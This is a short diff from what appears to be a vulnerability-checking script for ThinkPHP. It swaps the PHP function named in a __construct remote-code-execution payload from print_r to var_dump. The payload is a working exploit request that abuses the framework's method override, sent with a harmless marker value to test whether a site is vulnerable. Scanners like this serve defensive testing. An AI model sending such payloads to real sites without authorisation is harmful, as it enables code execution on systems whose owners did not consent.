@@ -20,7 +20,7 @@ def thinkphp_construct_code_exec_verify(url):
     }
     payload = {
         '_method':'__construct',
-        'filter[]':'print_r',
+        'filter[]':'var_dump',
         'method':'get',
         'server[REQUEST_METHOD]':'56540676a129760a3',
     }
